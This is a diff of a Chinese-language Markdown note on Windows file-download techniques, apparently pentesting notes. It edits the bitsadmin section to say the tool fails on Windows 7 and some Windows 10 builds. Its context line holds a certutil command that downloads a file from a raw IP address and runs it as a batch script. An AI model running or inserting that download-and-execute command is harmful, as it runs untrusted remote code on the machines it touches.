@@ -45,17 +45,25 @@ certutil -urlcache -split -f http://47.92.194.173/test.txt c:\a.bat&c:\a.bat
 
 ### 0x03 bitsadmin
 
-在Windows
+踩坑：
 
->BITSAdmin is deprecated and is not guaranteed to be available in future versions
-> of Windows.
->
->BITSAdmin已弃用，并且不能保证在将来的Windows版本中可用。
->
->Administrative tools for the BITS service are now provided by BITS PowerShell cm
->dlets.
->
->BITS PowerShell cmdlet现在提供了BITS服务的管理工具
+- 在Windows7或某些版本的Windows10上会运行失败会以下报错
+
+  > BITSAdmin is deprecated and is not guaranteed to be available in future versions
+  >  of Windows.
+  >
+  > BITSAdmin已弃用，并且不能保证在将来的Windows版本中可用。
+  >
+  > Administrative tools for the BITS service are now provided by BITS PowerShell cm
+  > dlets.
+  >
+  > BITS PowerShell cmdlet现在提供了BITS服务的管理工具
+
+- 啊
+
+
+
+
 
 Path:
 
